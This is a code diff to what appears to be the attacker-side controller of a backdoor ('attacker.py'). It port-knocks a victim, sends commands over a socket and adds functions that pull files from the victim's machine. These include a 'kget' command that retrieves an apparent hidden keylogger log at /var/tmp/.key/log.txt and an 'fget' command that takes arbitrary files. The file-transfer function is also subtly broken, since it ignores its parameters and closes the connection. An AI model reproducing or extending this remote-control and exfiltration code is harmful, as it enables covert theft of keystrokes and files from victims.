@@ -111,6 +111,28 @@ def main_menu(victimIP):
         else:
             print(f"err {selection} not found")
 
+def get_file(fileName, connection):
+    with client, client.makefile('rb') as clientfile:
+        filename = clientfile.readline().strip().decode()
+        length = int(clientfile.readline())
+        print(f'Downloading {filename}:{length}...')
+        # Read the data in chunks so it can handle large files.
+        with open(filename, 'wb') as f:
+            while length:
+                chunk = min(length, 4096)
+                data = clientfile.read(chunk)
+                if not data: break  # socket closed
+                f.write(data)
+                length -= len(data)
+
+        if length != 0:
+            print('Invalid download.')
+        else:
+            print('Done.')
+
+def get_directory(fileName, connection):
+    pass
+
 
 if __name__ == '__main__':
     try:
@@ -125,7 +147,6 @@ if __name__ == '__main__':
         print("example: attacker.py 192.168.0.1")
 
     knock(victimIp)
-    CHUNKSIZE = 1000000
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -142,4 +163,15 @@ if __name__ == '__main__':
                 command = main_menu(client_ip)
             if command == "exit":
                 break
+            command_type = command.split()[0]
             client.sendall(str(command).encode())
+            if command_type == "kget":
+                get_file("/var/tmp/.key/log.txt", client)
+            elif command_type == "fget":
+                get_file(" ".join(command.split()[1:]), client)
+            elif command_type == "wget":
+                get_directory(" ".join(command.split()[1:]), client)
+            else:
+                data = client.recv(4096)
+                print(data.decode())
+
